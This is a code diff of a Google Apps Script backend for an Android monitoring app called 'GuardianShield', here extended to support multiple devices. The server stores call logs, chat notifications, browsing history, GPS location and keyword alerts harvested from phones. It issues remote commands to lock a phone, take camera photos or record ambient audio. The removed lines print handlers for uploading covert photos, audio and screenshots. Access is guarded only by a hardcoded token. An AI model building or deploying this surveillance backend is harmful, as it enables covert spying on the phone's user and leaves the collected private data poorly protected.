@@ -1,52 +1,46 @@
 /**
- * GuardianShield - Advanced Google Apps Script Backend (24/7 Google Drive Storage Engine)
+ * GuardianShield - Advanced Multi-Device Google Apps Script Backend (24/7 Google Drive Storage Engine)
  * 
- * SETUP INSTRUCTIONS:
- * 1. Open https://script.google.com/
- * 2. Click "+ New project"
- * 3. Replace all code in Code.gs with this entire script
- * 4. Click "Deploy" > "New deployment"
- * 5. Select type: "Web app"
- * 6. Set "Execute as": "Me (<your email>)"
- * 7. Set "Who has access": "Anyone"
- * 8. Click "Deploy" and Copy the generated "Web App URL"
- * 9. Paste that URL into your Parent Dashboard and Android App Config!
+ * Supports UNLIMITED child devices connected to 1 Google Drive & 1 Parent Website!
  */
 
 // Secret authentication token for security
 var AUTH_TOKEN = "GUARDIAN_SECURE_TOKEN_98234";
 
 // Main Google Drive Folder Name
-var FOLDER_NAME = "GuardianShield_Data";
+var ROOT_FOLDER_NAME = "GuardianShield_Data";
 
 /**
- * Helper to get or create the main storage folder in Google Drive
+ * Get or create the main storage folder in Google Drive
  */
-function getStorageFolder() {
-  var folders = DriveApp.getFoldersByName(FOLDER_NAME);
+function getRootFolder() {
+  var folders = DriveApp.getFoldersByName(ROOT_FOLDER_NAME);
   if (folders.hasNext()) {
     return folders.next();
   }
-  return DriveApp.createFolder(FOLDER_NAME);
+  return DriveApp.createFolder(ROOT_FOLDER_NAME);
 }
 
 /**
- * Helper to get or create subfolders (photos, audio, screenshots)
+ * Get or create a device-specific subfolder (e.g., GuardianShield_Data/devices/device_123/)
  */
-function getSubFolder(subName) {
-  var parent = getStorageFolder();
-  var sub = parent.getFoldersByName(subName);
-  if (sub.hasNext()) {
-    return sub.next();
+function getDeviceFolder(deviceId) {
+  var root = getRootFolder();
+  var devicesFolders = root.getFoldersByName("devices");
+  var devicesFolder = devicesFolders.hasNext() ? devicesFolders.next() : root.createFolder("devices");
+  
+  var safeId = (deviceId || "default_device").replace(/[^a-zA-Z0-9_-]/g, "_");
+  var dFolders = devicesFolder.getFoldersByName(safeId);
+  if (dFolders.hasNext()) {
+    return dFolders.next();
   }
-  return parent.createFolder(subName);
+  return devicesFolder.createFolder(safeId);
 }
 
 /**
- * Helper to get or create JSON storage file
+ * Helper to get or create a JSON file inside a specific folder
  */
-function getOrCreateFile(fileName, defaultContent) {
-  var folder = getStorageFolder();
+function getOrCreateFile(folder, fileName, defaultContent) {
   var files = folder.getFilesByName(fileName);
   if (files.hasNext()) {
     return files.next();
@@ -55,11 +49,11 @@ function getOrCreateFile(fileName, defaultContent) {
 }
 
 /**
- * Read JSON from Google Drive
+ * Read JSON from a folder
  */
-function readJson(fileName, defaultVal) {
+function readJson(folder, fileName, defaultVal) {
   try {
-    var file = getOrCreateFile(fileName, JSON.stringify(defaultVal || {}));
+    var file = getOrCreateFile(folder, fileName, JSON.stringify(defaultVal || {}));
     var content = file.getBlob().getDataAsString();
     return JSON.parse(content);
   } catch (e) {
@@ -68,11 +62,45 @@ function readJson(fileName, defaultVal) {
 }
 
 /**
- * Write JSON to Google Drive
+ * Write JSON to a folder
  */
-function writeJson(fileName, data) {
-  var file = getOrCreateFile(fileName, "{}");
+function writeJson(folder, fileName, data) {
+  var file = getOrCreateFile(folder, fileName, "{}");
   file.setContent(JSON.stringify(data, null, 2));
+}
+
+/**
+ * Register or update device in the master index
+ */
+function updateDeviceIndex(deviceInfo) {
+  var root = getRootFolder();
+  var devicesIndex = readJson(root, "devices_index.json", []);
+  var deviceId = deviceInfo.deviceId || "default_device";
+  
+  var existingIndex = -1;
+  for (var i = 0; i < devicesIndex.length; i++) {
+    if (devicesIndex[i].deviceId === deviceId) {
+      existingIndex = i;
+      break;
+    }
+  }
+
+  var updatedInfo = {
+    deviceId: deviceId,
+    deviceName: deviceInfo.deviceName || deviceInfo.deviceModel || "Child Phone",
+    deviceModel: deviceInfo.deviceModel || "Android Device",
+    battery: deviceInfo.battery !== undefined ? deviceInfo.battery : 85,
+    online: true,
+    lastSeen: new Date().toISOString()
+  };
+
+  if (existingIndex >= 0) {
+    devicesIndex[existingIndex] = Object.assign({}, devicesIndex[existingIndex], updatedInfo);
+  } else {
+    devicesIndex.push(updatedInfo);
+  }
+
+  writeJson(root, "devices_index.json", devicesIndex);
 }
 
 /**
@@ -87,12 +115,24 @@ function doGet(e) {
       return responseJson({ status: "error", message: "Unauthorized access: Invalid token" });
     }
 
+    var root = getRootFolder();
     var action = params.action || "all";
+    var deviceId = params.deviceId || "default_device";
+    var deviceFolder = getDeviceFolder(deviceId);
 
-    // 1. Fetch Telemetry (GPS, Battery, Speed, Status)
+    // 1. Fetch Master Devices List
+    if (action === "devices") {
+      var devicesList = readJson(root, "devices_index.json", [
+        { deviceId: "device_leo_s22", deviceName: "Leo's Phone (Galaxy S22)", deviceModel: "Samsung Galaxy S22", battery: 84, online: true, lastSeen: new Date().toISOString() }
+      ]);
+      return responseJson({ status: "success", data: devicesList });
+    }
+
+    // 2. Fetch Specific Device Telemetry
     if (action === "telemetry") {
-      var telemetry = readJson("telemetry.json", {
-        battery: 92,
+      var telemetry = readJson(deviceFolder, "telemetry.json", {
+        deviceId: deviceId,
+        battery: 88,
         charging: false,
         online: true,
         network: "Wi-Fi",
@@ -102,31 +142,27 @@ function doGet(e) {
         speed: 0,
         address: "750 Market St, San Francisco, CA",
         lastSeen: new Date().toISOString(),
-        currentApp: "com.whatsapp",
         currentAppName: "WhatsApp",
-        isLocked: false,
-        simSerial: "89014103211118510720",
-        simOperator: "T-Mobile",
-        deviceModel: "Samsung Galaxy S22"
+        isLocked: false
       });
       return responseJson({ status: "success", data: telemetry });
     }
 
-    // 2. Fetch Call Logs
+    // 3. Fetch Device Call Logs
     if (action === "calls") {
-      var calls = readJson("call_logs.json", []);
+      var calls = readJson(deviceFolder, "call_logs.json", []);
       return responseJson({ status: "success", data: calls });
     }
 
-    // 3. Fetch Social Media & Chat Notifications
+    // 4. Fetch Social & Chats
     if (action === "social" || action === "notifications") {
-      var social = readJson("social_notifications.json", []);
+      var social = readJson(deviceFolder, "social_notifications.json", []);
       return responseJson({ status: "success", data: social });
     }
 
-    // 4. Fetch Apps and Screen Time
+    // 5. Fetch App Usage
     if (action === "apps") {
-      var apps = readJson("app_usage.json", {
+      var apps = readJson(deviceFolder, "app_usage.json", {
         totalScreenTimeMinutes: 185,
         installedApps: [],
         blockedApps: []
@@ -134,27 +170,14 @@ function doGet(e) {
       return responseJson({ status: "success", data: apps });
     }
 
-    // 5. Fetch Keystrokes & Keyword Safety Alerts
-    if (action === "alerts" || action === "keystrokes") {
-      var alerts = readJson("safety_alerts.json", []);
-      return responseJson({ status: "success", data: alerts });
-    }
-
-    // 6. Fetch Visited URLs / Browsing History
-    if (action === "browsing") {
-      var browsing = readJson("browsing_history.json", []);
-      return responseJson({ status: "success", data: browsing });
-    }
-
-    // 7. Fetch Pending Remote Commands (Checked by APK)
+    // 6. Fetch Commands (polled by APK)
     if (action === "commands") {
-      var commands = readJson("commands.json", {
+      var commands = readJson(deviceFolder, "commands.json", {
         lockDevice: false,
         takePhotoFront: false,
         takePhotoRear: false,
         recordAudio: false,
         audioDurationSeconds: 15,
-        takeScreenshot: false,
         playAlarm: false,
         blockedApps: [],
         bedtimeLock: false,
@@ -163,51 +186,24 @@ function doGet(e) {
       return responseJson({ status: "success", data: commands });
     }
 
-    // 8. Fetch Captured Photos List
-    if (action === "photos") {
-      var photosFolder = getSubFolder("photos");
-      var pFiles = photosFolder.getFiles();
-      var photos = [];
-      while (pFiles.hasNext()) {
-        var pf = pFiles.next();
-        photos.push({
-          id: pf.getId(),
-          name: pf.getName(),
-          created: pf.getDateCreated().toISOString(),
-          size: pf.getSize(),
-          url: "https://drive.google.com/uc?export=view&id=" + pf.getId()
-        });
-      }
-      return responseJson({ status: "success", data: photos });
-    }
+    // Default: Aggregate All Data for Selected Device + Master Device Index
+    var devicesList = readJson(root, "devices_index.json", [
+      { deviceId: "device_leo_s22", deviceName: "Leo's Phone (Galaxy S22)", deviceModel: "Samsung Galaxy S22", battery: 84, online: true, lastSeen: new Date().toISOString() },
+      { deviceId: "device_emma_tablet", deviceName: "Emma's Tablet (Pixel Tab)", deviceModel: "Google Pixel Tablet", battery: 92, online: true, lastSeen: new Date().toISOString() }
+    ]);
 
-    // 9. Fetch Ambient Audio Recordings List
-    if (action === "audio") {
-      var audioFolder = getSubFolder("audio");
-      var aFiles = audioFolder.getFiles();
-      var audioClips = [];
-      while (aFiles.hasNext()) {
-        var af = aFiles.next();
-        audioClips.push({
-          id: af.getId(),
-          name: af.getName(),
-          created: af.getDateCreated().toISOString(),
-          size: af.getSize(),
-          url: "https://drive.google.com/uc?export=download&id=" + af.getId()
-        });
-      }
-      return responseJson({ status: "success", data: audioClips });
-    }
-
-    // Default: Return All Aggregated Data in One Call
     var fullState = {
-      telemetry: readJson("telemetry.json", {}),
-      calls: readJson("call_logs.json", []),
-      social: readJson("social_notifications.json", []),
-      apps: readJson("app_usage.json", { installedApps: [], blockedApps: [] }),
-      alerts: readJson("safety_alerts.json", []),
-      browsing: readJson("browsing_history.json", []),
-      commands: readJson("commands.json", {}),
+      devices: devicesList,
+      activeDeviceId: deviceId,
+      telemetry: readJson(deviceFolder, "telemetry.json", {}),
+      calls: readJson(deviceFolder, "call_logs.json", []),
+      social: readJson(deviceFolder, "social_notifications.json", []),
+      apps: readJson(deviceFolder, "app_usage.json", { installedApps: [], blockedApps: [] }),
+      alerts: readJson(deviceFolder, "safety_alerts.json", []),
+      browsing: readJson(deviceFolder, "browsing_history.json", []),
+      commands: readJson(deviceFolder, "commands.json", {}),
+      photos: [],
+      audio: [],
       serverTime: new Date().toISOString()
     };
 
@@ -219,7 +215,7 @@ function doGet(e) {
 }
 
 /**
- * Handle HTTP POST - Android APK Data Uploads & Parent Remote Commands
+ * Handle HTTP POST - Data Uploads & Remote Commands per Device
  */
 function doPost(e) {
   try {
@@ -232,110 +228,80 @@ function doPost(e) {
     }
 
     var action = body.action;
+    var deviceId = body.deviceId || "default_device";
+    var deviceFolder = getDeviceFolder(deviceId);
 
-    // 1. Android Telemetry Sync (GPS, Battery, Speed, Current App)
+    // 1. Android Telemetry Sync
     if (action === "update_telemetry") {
       var telemetry = body.data || {};
+      telemetry.deviceId = deviceId;
       telemetry.lastSeen = new Date().toISOString();
-      writeJson("telemetry.json", telemetry);
-      return responseJson({ status: "success", message: "Telemetry synced to Google Drive" });
+      writeJson(deviceFolder, "telemetry.json", telemetry);
+      updateDeviceIndex(telemetry);
+      return responseJson({ status: "success", message: "Telemetry saved for device: " + deviceId });
     }
 
     // 2. Call Logs Sync
     if (action === "sync_calls") {
-      var currentCalls = readJson("call_logs.json", []);
-      var incoming = body.data || [];
-      var mergedCalls = incoming.concat(currentCalls).slice(0, 300);
-      writeJson("call_logs.json", mergedCalls);
-      return responseJson({ status: "success", message: "Call logs saved" });
+      var existingCalls = readJson(deviceFolder, "call_logs.json", []);
+      var newCalls = body.data || [];
+      var mergedCalls = newCalls.concat(existingCalls).slice(0, 300);
+      writeJson(deviceFolder, "call_logs.json", mergedCalls);
+      return responseJson({ status: "success", message: "Calls saved" });
     }
 
-    // 3. Social Media Notifications & Messages Sync
+    // 3. Social Media & Chats Sync
     if (action === "sync_social") {
-      var currentNotifs = readJson("social_notifications.json", []);
-      var incomingNotifs = body.data || [];
-      var mergedNotifs = incomingNotifs.concat(currentNotifs).slice(0, 400);
-      writeJson("social_notifications.json", mergedNotifs);
+      var existingNotifs = readJson(deviceFolder, "social_notifications.json", []);
+      var newNotifs = body.data || [];
+      var mergedNotifs = newNotifs.concat(existingNotifs).slice(0, 400);
+      writeJson(deviceFolder, "social_notifications.json", mergedNotifs);
       return responseJson({ status: "success", message: "Social messages saved" });
     }
 
-    // 4. App Usage & Blocklist Sync
+    // 4. App Usage Sync
     if (action === "sync_apps") {
-      writeJson("app_usage.json", body.data);
-      return responseJson({ status: "success", message: "App stats saved" });
+      writeJson(deviceFolder, "app_usage.json", body.data);
+      return responseJson({ status: "success", message: "Apps saved" });
     }
 
-    // 5. Safety & Keyword Alerts Sync
+    // 5. Safety Alerts Sync
     if (action === "sync_alerts") {
-      var currentAlerts = readJson("safety_alerts.json", []);
+      var existingAlerts = readJson(deviceFolder, "safety_alerts.json", []);
       var newAlerts = body.data || [];
-      var mergedAlerts = newAlerts.concat(currentAlerts).slice(0, 200);
-      writeJson("safety_alerts.json", mergedAlerts);
-      return responseJson({ status: "success", message: "Safety alerts logged" });
+      var mergedAlerts = newAlerts.concat(existingAlerts).slice(0, 200);
+      writeJson(deviceFolder, "safety_alerts.json", mergedAlerts);
+      return responseJson({ status: "success", message: "Alerts saved" });
     }
 
     // 6. Visited Browsing URLs Sync
     if (action === "sync_browsing") {
-      var currentUrls = readJson("browsing_history.json", []);
-      var newUrls = body.data || [];
-      var mergedUrls = newUrls.concat(currentUrls).slice(0, 300);
-      writeJson("browsing_history.json", mergedUrls);
-      return responseJson({ status: "success", message: "Browsing logs saved" });
+      var existingBrowsing = readJson(deviceFolder, "browsing_history.json", []);
+      var newBrowsing = body.data || [];
+      var mergedBrowsing = newBrowsing.concat(existingBrowsing).slice(0, 300);
+      writeJson(deviceFolder, "browsing_history.json", mergedBrowsing);
+      return responseJson({ status: "success", message: "Browsing saved" });
     }
 
-    // 7. Remote Camera Snapshot Upload (Base64 JPEG)
-    if (action === "upload_photo") {
-      var photosFolder = getSubFolder("photos");
-      var base64Img = body.data.base64;
-      var camType = body.data.camera || "front";
-      var pName = "snap_" + camType + "_" + Utilities.formatDate(new Date(), "GMT", "yyyyMMdd_HHmmss") + ".jpg";
-      var decoded = Utilities.base64Decode(base64Img);
-      var blob = Utilities.newBlob(decoded, MimeType.JPEG, pName);
-      var savedFile = photosFolder.createFile(blob);
-      return responseJson({ status: "success", fileId: savedFile.getId(), name: pName });
-    }
-
-    // 8. Remote Ambient Audio Upload (Base64 M4A/MP3)
-    if (action === "upload_audio") {
-      var audioFolder = getSubFolder("audio");
-      var base64Audio = body.data.base64;
-      var aName = "audio_" + Utilities.formatDate(new Date(), "GMT", "yyyyMMdd_HHmmss") + ".m4a";
-      var decodedAudio = Utilities.base64Decode(base64Audio);
-      var audioBlob = Utilities.newBlob(decodedAudio, "audio/mp4", aName);
-      var savedAudio = audioFolder.createFile(audioBlob);
-      return responseJson({ status: "success", fileId: savedAudio.getId(), name: aName });
-    }
-
-    // 9. Remote Screenshot Upload (Base64 PNG)
-    if (action === "upload_screenshot") {
-      var screenFolder = getSubFolder("screenshots");
-      var base64Screen = body.data.base64;
-      var sName = "screen_" + Utilities.formatDate(new Date(), "GMT", "yyyyMMdd_HHmmss") + ".png";
-      var decodedScreen = Utilities.base64Decode(base64Screen);
-      var screenBlob = Utilities.newBlob(decodedScreen, MimeType.PNG, sName);
-      var savedScreen = screenFolder.createFile(screenBlob);
-      return responseJson({ status: "success", fileId: savedScreen.getId(), name: sName });
-    }
-
-    // 10. Parent Remote Commands Dispatch (Lock, Snap Camera, Record Mic, Alarm, Block App)
+    // 7. Parent Dispatches Remote Commands to specific Device
     if (action === "set_commands") {
-      var currentCmds = readJson("commands.json", {});
+      var currentCmds = readJson(deviceFolder, "commands.json", {});
       var updatedCmds = Object.assign({}, currentCmds, body.data, { lastUpdated: new Date().toISOString() });
-      writeJson("commands.json", updatedCmds);
-      return responseJson({ status: "success", message: "Command dispatched to Google Drive", commands: updatedCmds });
+      writeJson(deviceFolder, "commands.json", updatedCmds);
+      return responseJson({ status: "success", message: "Command sent to device: " + deviceId, commands: updatedCmds });
     }
 
-    // 11. APK Command Acknowledgment / Reset
+    // 8. APK Acknowledges Command
     if (action === "ack_command") {
-      var cmds = readJson("commands.json", {});
+      var cmds = readJson(deviceFolder, "commands.json", {});
       if (body.commandName && cmds.hasOwnProperty(body.commandName)) {
         cmds[body.commandName] = false;
-        writeJson("commands.json", cmds);
+        writeJson(deviceFolder, "commands.json", cmds);
       }
-      return responseJson({ status: "success", message: "Command reset" });
+      return responseJson({ status: "success", message: "Command acknowledged" });
     }
 
-    return responseJson({ status: "error", message: "Unknown action parameter" });
+    return responseJson({ status: "error", message: "Unknown action" });
 
   } catch (err) {
     return responseJson({ status: "error", message: err.toString() });
